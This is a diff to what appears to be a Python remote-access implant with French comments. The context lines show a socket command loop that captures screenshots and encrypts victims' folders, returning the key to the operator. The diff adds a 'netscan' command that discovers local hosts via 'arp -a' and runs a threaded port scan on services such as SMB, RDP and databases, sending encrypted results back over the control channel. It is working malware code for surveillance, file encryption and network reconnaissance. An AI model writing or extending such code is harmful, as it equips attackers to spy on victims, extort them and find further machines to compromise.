@@ -7,6 +7,7 @@ import time
 import shutil
 import winreg
 import mss
+import threading
 from cryptography.fernet import Fernet
 
 
@@ -84,6 +85,10 @@ def main():
                     elif commande == "screenshot":
                         data = take_screenshot()
                         sock.sendall(data)
+
+                    elif commande == "netscan":
+                        resultat = netscan()
+                        sock.send(cipher.encrypt(resultat.encode()))
 
                     elif commande.startswith("encrypt "):
                         chemin = commande.split(" ", 1)[1]
@@ -213,6 +218,67 @@ def encrypt_folder(chemin):
         return f"{compteur} fichiers chiffres dans {chemin}\nCLEF:{clef.decode()}"
     except Exception as e:
         return f"Erreur chiffrement: {e}"
+
+
+# nmap simplifie : decouvre les machines du reseau puis scan leurs ports
+def netscan():
+    try:
+        import re
+        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445,
+                 993, 1433, 3306, 3389, 5432, 5900, 8080, 8443]
+
+        # scan les ports d'une ip avec des threads
+        def scanner_ip(ip):
+            ouverts = []
+            def tester(port):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)
+                    if s.connect_ex((ip, port)) == 0:
+                        ouverts.append(port)
+                    s.close()
+                except:
+                    pass
+            threads = []
+            for port in ports:
+                t = threading.Thread(target=tester, args=(port,))
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join(timeout=2)
+            ouverts.sort()
+            return ouverts
+
+        # on recupere les ips du reseau via arp
+        proc = subprocess.run(
+            ["powershell.exe", "-Command", "arp -a"],
+            capture_output=True, text=True,
+            encoding="utf-8", errors="replace", timeout=15
+        )
+        ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", proc.stdout)
+        # on enleve les doublons et les adresses de broadcast
+        ips = list(dict.fromkeys(ip for ip in ips if not ip.endswith(".255")))
+
+        resultat = "=== Scan reseau ===\n"
+
+        # scan du pc local d'abord
+        local_ports = scanner_ip("127.0.0.1")
+        if local_ports:
+            resultat += f"127.0.0.1 (local) : {','.join(str(p) for p in local_ports)}\n"
+        else:
+            resultat += "127.0.0.1 (local) : aucun port ouvert\n"
+
+        # scan de chaque ip trouvee sur le reseau
+        for ip in ips:
+            ip_ports = scanner_ip(ip)
+            if ip_ports:
+                resultat += f"{ip} : {','.join(str(p) for p in ip_ports)}\n"
+            else:
+                resultat += f"{ip} : aucun port ouvert\n"
+
+        return resultat.strip()
+    except Exception as e:
+        return f"Erreur netscan: {e}"
 
 
 if __name__ == "__main__":
